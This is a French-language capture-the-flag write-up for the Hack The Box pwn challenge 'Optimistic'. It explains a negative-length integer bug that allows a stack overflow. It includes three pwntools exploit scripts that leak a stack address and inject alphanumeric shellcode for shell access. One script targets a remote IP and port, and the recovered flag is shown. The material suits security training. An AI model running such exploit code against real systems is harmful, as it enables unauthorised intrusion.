# Optimistic [Pwn] Challenge

`— File —`

C’est un 64 bit ELF linux sans protection au injection de code.

![Untitled](Optimistic%20%5BPwn%5D%20Challenge%20dc272f69da1542448fbd85d3739f27ca/Untitled.png)

Dans ghidra nous voyons que nous avons une taille limité dans les variables d’entré qui ne nous permet pas de mettre de code dedans.

![Untitled](Optimistic%20%5BPwn%5D%20Challenge%20dc272f69da1542448fbd85d3739f27ca/Untitled%201.png)

Mais ces variables limité étant des ulong et qu’une des ces variables est un int si le int prend `-1` les ulong se transforme en valeurs maximal.

La variable de la longueur du nom définissant la taille alloué à ‘Name :’ nous mettrons `-1` à ‘length of name:’ ce qui mettra le ulong de ‘Name: ‘ en maximum.

Les entrés avec nos script ressemblerons à cella :

![Untitled](Optimistic%20%5BPwn%5D%20Challenge%20dc272f69da1542448fbd85d3739f27ca/Untitled%202.png)

`— Exploit —`

L’exploit final est celui-ci sans être améliorer au max

```python
#!/usr/bin/python3

from pwn import *

def main():
        context.log_level='DEBUG'
        context.update(arch='amd64', os='linux')
        log.info('Optimistic Exploit')
        p=process('./optimistic')

        p.recvuntil('(y/n): ')
        p.sendline('y')

        leak_address = p.recvline().split()[-1]
        leak_address = int(leak_address,16)
        log.success(f'address: {hex(leak_address)}')

        p.recvuntil(b'Email: ')
        p.sendline(b'mail')
        p.recvuntil(b'Age: ')
        p.sendline(b'8')
        p.recvuntil(b'Length of name: ')
        p.sendline(b'-1')

        #Exploit
        leak_address = leak_address - 96
        offset = 104
        #shellcode en Alpha uniquement https://www.exploit-db.com/shellcodes/35205
        shellcode  = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
        padding = b'A' * (offset - len(shellcode))

        payload = shellcode + padding + pack(leak_address, 64, 'little', 'no')
        p.sendlineafter(b'Name: ', payload)
        p.interactive

if __name__ == '__main__':
        main()
```

Explication :

Nous allons d’abord expliquer le programme à la lib pwn, nous voulons le mode DEBUG pour nous permettre d’observer toute les entrés et reçu. 

Ensuite le programme va mettre ‘y’ et récupérer l’adresse données par le programme en cadeau et le mettre en bonne forme.

Le programme rentre ensuite des entrés qui ne vont pas faire arrêter le programme.

Et mettre le -1 à sendline pour augmenter la capacité de ‘Name:’

On créé ensuite l’exploit on fait -96 à l’adresse pour la mettre en fin de payload ?

On met 104 à l’offset car cela va être la taille max de notre payload.

Le shellcode reverse shell à été trouvé sur [https://www.exploit-db.com/shellcodes/35205](https://www.exploit-db.com/shellcodes/35205)

On le prend en alpha car il serra comprit uniquement comme ça et ça économise la place de l’envoie ?

la padding va remplir de ‘A’ à la limite pour ne pas empiété sur le shellcode.

Le programme envoie le payload à la vu de ‘Name:’

et on le laisse en interactive pour pouvoir envoyer des commande à l’ordinateur exploiter.

2ème manière de faire l’exploit plus claire :

```python
#!/usr/bin/env python3
from pwn import *

target = './optimistic'
elf = context.binary = ELF(target, checksec=False)
context.log_level = 'info'

if args.REMOTE:
        p = remote(sys.argv[1], int(sys.argv[2]))
else:
        p= process([target])

p.sendlineafter(b'(y/n): ', b'y')
p.recvuntil(b'Great! Here\'s a small welcome gift: ')
stack_address = int(p.recvline(), 16)
p.sendlineafter(b'Email: ', b'AAAA')
p.sendlineafter(b'Age: ', b'BBBB')

p.sendlineafter(b'Length of name: ', b'-1')

#exploit
stack_address = stack_address - 96
offset = 104

#shellcode need to be in alpha only 64bit https://www.exploit-db.com/shellcodes/35205
shellcode = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'

padding = b'A'* (offset - len(shellcode))
payload = shellcode + padding + pack(stack_address, 64, 'little', 'no')
p.sendlineafter(b'Name: ', payload)
p.interactive()
```

`— Prendre le Flag —`

On change la ligne remote poru le serveur et nous obtenons un reverse shell

```python
#!/usr/bin/python3

from pwn import *

def main():
        context.log_level='DEBUG'
        context.update(arch='amd64', os='linux')
        log.info('Optimistic Exploit')
        p=remote('178.62.83.221', 32121)

        p.recvuntil('(y/n): ')
        p.sendline('y')

        leak_address = p.recvline().split()[-1]
        leak_address = int(leak_address,16)
        log.success(f'address: {hex(leak_address)}')

        p.recvuntil(b'Email: ')
        p.sendline(b'mail')
        p.recvuntil(b'Age: ')
        p.sendline(b'8')
        p.recvuntil(b'Length of name: ')
        p.sendline(b'-1')

        #Exploit
        leak_address = leak_address - 96
        offset = 104
        #shellcode en Alpha uniquement
        shellcode  = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
        padding = b'A' * (offset - len(shellcode))

        payload = shellcode + padding + pack(leak_address, 64, 'little', 'no')
        print(payload)
        p.sendlineafter(b'Name: ', payload)
        p.interactive()

if __name__ == '__main__':
        main()
```

`cat flag.txt`

![Untitled](Optimistic%20%5BPwn%5D%20Challenge%20dc272f69da1542448fbd85d3739f27ca/Untitled%203.png)

HTB{be1ng_negat1v3_pays_0ff!}